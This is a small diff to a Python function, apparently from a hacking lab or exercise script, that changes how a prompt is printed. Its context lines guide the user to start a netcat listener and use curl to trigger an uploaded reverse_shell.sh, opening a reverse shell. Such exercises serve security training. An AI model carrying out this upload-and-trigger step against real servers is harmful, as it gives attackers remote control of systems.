@@ -27,5 +27,6 @@ def reverse_shell_upload(port):
     print(green + "Did you succeed ?" + nc)
     print("On a different terminal, launch: " + blue + "nc -lvp 65000" + nc)
     print("On another terminal, launch " + blue + "curl localhost:" + str(port) + "/putStuff/reverse_shell.sh" + nc)
-    input("So did you get your reverse shell ? If yes " + red + "Congrats" + nc + "!!!")
+    print("So did you get your reverse shell ? If yes " + red + "Congrats" + nc + "!!!")
+    input()
 
